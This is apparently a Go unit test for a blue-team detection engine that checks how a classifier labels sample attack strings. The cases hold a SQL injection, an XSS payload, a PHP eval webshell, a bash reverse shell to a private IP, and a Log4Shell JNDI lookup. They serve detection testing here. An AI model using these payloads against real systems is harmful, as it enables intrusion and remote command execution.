package local_test

import (
	"testing"

	localbash "github.com/Martin2877/blue-team-box/engine/local/bash"
	"github.com/Martin2877/blue-team-box/engine/local/btt"
	localsqli "github.com/Martin2877/blue-team-box/engine/local/sqli"
	localwebshell "github.com/Martin2877/blue-team-box/engine/local/webshell"
	localxss "github.com/Martin2877/blue-team-box/engine/local/xss"
)

// TestDetectSamples 校验统一识别接口对各类示例 payload 的分类结果，
// 逻辑与 api/routers/v2/risk/detect.go 中 DetectOnce 保持一致
func TestDetectSamples(t *testing.T) {
	cases := []struct {
		name    string
		payload string
		want    string
	}{
		{"sqli", `' or 'x'='x`, "sqli"},
		{"sqli_page", `) or true--","' or 'x'='x","'`, "sqli"},
		{"xss", `IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))`, "xss"},
		{"webshell", `<?php @eval($_POST['cmd']); ?>`, "webshell"},
		{"bash", `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, "bash"},
		{"log4j2", `${jndi:ldap://127.0.0.1:1389/Exploit}`, "log4j2"},
	}
	type item struct {
		typ   string
		found bool
		score int
	}
	scoreOf := func(f bool, s int) int {
		if f {
			return s
		}
		return 0
	}
	for _, c := range cases {
		var items []item
		if r := localwebshell.Check([]byte(c.payload)); r.Webshell {
			items = append(items, item{"webshell", true, r.Score})
		} else {
			items = append(items, item{"webshell", false, r.Score})
		}
		if r := localbash.Check(c.payload); r.Found {
			items = append(items, item{"bash", true, r.Score})
		} else {
			items = append(items, item{"bash", false, r.Score})
		}
		_, danger := btt.ParseLog4j2(c.payload)
		items = append(items, item{"log4j2", danger, scoreOf(danger, 5)})
		sj, _ := (&localsqli.Sqli{}).SubmitOnce(c.payload)
		items = append(items, item{"sqli", sj != nil && sj.Code == 20000, scoreOf(sj != nil && sj.Code == 20000, 5)})
		xj, _ := (&localxss.XSS{}).SubmitOnce(c.payload)
		items = append(items, item{"xss", xj != nil && xj.Code == 20000, scoreOf(xj != nil && xj.Code == 20000, 5)})

		got := ""
		best := -1
		for i, it := range items {
			if it.found && (best < 0 || it.score > items[best].score) {
				best = i
			}
		}
		if best >= 0 {
			got = items[best].typ
		}
		if got != c.want {
			t.Fatalf("%s: 分类为 %q，期望 %q", c.name, got, c.want)
		}
	}
}
